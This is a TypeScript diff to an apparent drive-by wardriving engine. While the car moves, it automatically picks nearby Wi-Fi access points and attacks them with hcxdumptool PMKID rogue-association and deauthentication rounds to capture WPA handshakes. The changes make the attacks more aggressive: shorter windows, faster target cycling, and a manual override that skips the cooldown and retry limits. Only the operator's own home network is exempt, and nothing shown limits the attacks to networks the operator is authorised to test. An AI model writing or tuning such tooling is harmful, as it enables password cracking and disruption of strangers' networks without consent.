@@ -30,12 +30,20 @@ function killStrayCaptures(iface: string): Promise<void> {
 
 // ─── Policy constants (docs/wardrive.md) ───────────────────────────────
 const HOP_INTERVAL_MS = 400; // same cadence wifiradar proves works on this phy
-const MAX_ATTEMPTS = 5; // per AP per session; then it's "exhausted"
-const ATTACK_COOLDOWN_MS = 30_000; // between rounds on the SAME AP
+const MAX_ATTEMPTS = 4; // per AP per session; then it's "exhausted"
+// Cooldown between rounds on the SAME AP. At driving speed the car LEAVES
+// the AP's range in <60s — a 30s cooldown used to mean the second round
+// happened out of range and was pure radio waste. 12s keeps the retry
+// inside the window where the AP is still audible.
+const ATTACK_COOLDOWN_MS = 12_000;
 const RSSI_GATE_DBM = -75; // "good enough to try" for any AP
 const RSSI_GATE_KNOWN_DBM = -85; // priority SSIDs (operator's lab list) get a wider gate
-const PMKID_WINDOW_MS = 30_000; // hcxdumptool window per target
-const DEAUTH_WINDOW_MS = 30_000; // hcxdumptool deauth+capture window (fallback)
+// Attack windows. Driving lessons: the car passes an AP in ~15-45s, and an
+// hcxdumptool rogue-association PMKID round usually lands (or fails) inside
+// the first ~12s. Short windows = more APs get a shot while in range.
+// (The desktop Wifi Audit keeps its longer windows — stationary there.)
+const PMKID_WINDOW_MS = 15_000; // hcxdumptool window per target
+const DEAUTH_WINDOW_MS = 12_000; // hcxdumptool deauth+capture window (fallback)
 const DEAUTH_SPEED_MAX_KMH = 25; // deauth fallback only slow/stopped
 const MIN_EAPOL_PAIRS = 1; // PMKID counts as 1 pair; a real 4-way as 2+
 const SESSION_TICK_MS = 1_000; // status/GPS/DB cadence
@@ -48,7 +56,7 @@ const SESSION_TICK_MS = 1_000; // status/GPS/DB cadence
 const GPS_WATCH_MS = 2_000;
 const POINT_MIN_MOVE_M = 6; // GPS track resolution (driving ~8m at 30km/h)
 const POINT_MAX_DT_MS = 20_000; // also drop a point when parked this long
-const TARGET_SCAN_INTERVAL_MS = 5_000; // pick a new attack target this often
+const TARGET_SCAN_INTERVAL_MS = 1_500; // pick a new attack target this often
 const ATTACK_SETTLE_MS = 2_000; // between hcxdumptool exit and discovery restart
 const BURST_GAP_MS = 1_200; // between deauth bursts inside a window
 
@@ -614,6 +622,29 @@ export class DriveWardriveService extends EventEmitter {
     void this.attackAp(ap, st);
   }
 
+  async attackApExternal(bssidRaw: string, method?: "pmkid" | "deauth"): Promise<{ ok: boolean; error?: string }> {
+    const bssid = sanitizeMac(bssidRaw);
+    if (!bssid) return { ok: false, error: "BSSID inválido" };
+    if (!this.running) return { ok: false, error: "Wardrive no está activo" };
+    if (this.demo) return { ok: false, error: "Demo: no hay radio que atacar" };
+    if (this.attackBusy) return { ok: false, error: "Hay un ataque en curso — esperá que termine" };
+    const ap = this.air.get(bssid);
+    if (!ap) return { ok: false, error: "El objetivo no está visible en el aire ahora" };
+    if (this.homeSsid && ap.ssid === this.homeSsid) {
+      return { ok: false, error: "Ese SSID es la red protegida de Akbal — nunca se ataca" };
+    }
+    const st = this.stateFor(bssid);
+    if (st.captured || this.knownHandshakeSsids.has(ap.ssid)) {
+      return { ok: false, error: "Este SSID ya tiene handshake capturado" };
+    }
+    // Manual override: ignore cooldown/exhaustion gates — the operator
+    // DECIDED to spend the radio here (the auto-scheduler keeps honoring
+    // them for its own picks).
+    void method; // same PMKID→deauth smart round either way
+    void this.attackAp(ap, st);
+    return { ok: true };
+  }
+
   // One attack round against ONE AP.
   //
   // ROUND BUDGET (the 20-min-run lesson): each AP gets AT MOST one PMKID
@@ -621,14 +652,17 @@ export class DriveWardriveService extends EventEmitter {
   // Previously the engine re-attacked the same 5 visible APs forever
   // (193 rounds ≈ 3.4h of radio) while fresh targets starved and the
   // hopper never left ch1 — 20 min of driving produced 0 handshakes.
-  // Now: attack → cooldown → next candidate. A previously-failed AP is
-  // only retried once the FRESH tier is empty (see pickTarget tiers).
+  // Aggro pass (driving efficiency): with short windows + 12s cooldown the
+  // engine now cycles targets fast while in range; the historical budget
+  // still prevents the burn-on-one-AP failure mode.
   private async attackAp(ap: AirAp, st: ApSessionState): Promise<void> {
     if (!this.iface || !this.running || this.attackBusy) return;
     this.attackBusy = true;
     this.attackBssid = ap.bssid;
     this.attackChannel = ap.channel || this.currentChannel || 1;
-    this.attackUntil = Date.now() + PMKID_WINDOW_MS + 15_000;
+    // One window + settle margin, so the UI/hopper know exactly how long
+    // the radio is committed.
+    this.attackUntil = Date.now() + PMKID_WINDOW_MS + DEAUTH_WINDOW_MS + 15_000;
     st.status = "attacking";
     st.attempts += 1;
     driveDb.recordAttempt(ap.bssid, "pmkid");
@@ -1118,7 +1152,7 @@ export class DriveWardriveService extends EventEmitter {
   }
 
   private pickTarget(): void {
-    // Targeting rules (docs/wardrive.md):
+    // Targeting rules (docs/wardrive.md + the 20-min-run lesson):
     //   1. NEW SSIDs first: a network never attacked before beats a
     //      previously-attempted one (that attempt failed — don't starve
     //      fresh targets behind old failures). Only when NO new SSIDs are
@@ -1127,6 +1161,10 @@ export class DriveWardriveService extends EventEmitter {
     //      first, then by best RSSI.
     //   3. SSIDs with a handshake are NEVER re-attacked — the dedup check
     //      (knownHandshakeSsids, table-driven) skips them entirely.
+    //   4. Driving-speed aggression: the scheduler re-picks THE MOMENT the
+    //      radio is free (TARGET_SCAN_INTERVAL_MS) and the attack windows
+    //      are short — more APs get a shot while still in range. The
+    //      AP-level cooldown is the only spacing left.
     if (!this.running) return;
     if (this.demo) {
       this.demoCapture();
